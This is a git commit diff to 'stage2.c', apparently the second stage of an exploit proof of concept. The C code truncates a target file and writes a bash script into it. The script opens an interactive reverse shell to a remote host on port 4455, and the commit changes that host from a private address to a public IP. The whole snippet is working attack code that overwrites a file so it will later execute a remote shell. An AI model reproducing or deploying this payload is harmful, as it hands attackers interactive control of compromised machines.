82c437eca6f50724a42ad677ccc446a31334028e
Minseo Kim <86199517+seoyamin@users.noreply.github.com>
2025-03-28 16:25:28 +0900

    Update stage2.c

--- albbacompany_web/stage2.c
+++ albbacompany_web/stage2.c
@@ -15,7 +15,7 @@ int main(int argc, char **argv) {
         int fd = open(argv[1], O_RDWR|O_TRUNC);
         printf("HAX2: fd: %d\n", fd);
 
-        const char *poc = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.86.1/4455 0>&1  &\n";
+        const char *poc = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/3.36.86.135/4455 0>&1  &\n";
         int res = write(fd, poc, strlen(poc));
         printf("HAX2: res: %d, %d\n", res, errno);
         res1 = res;
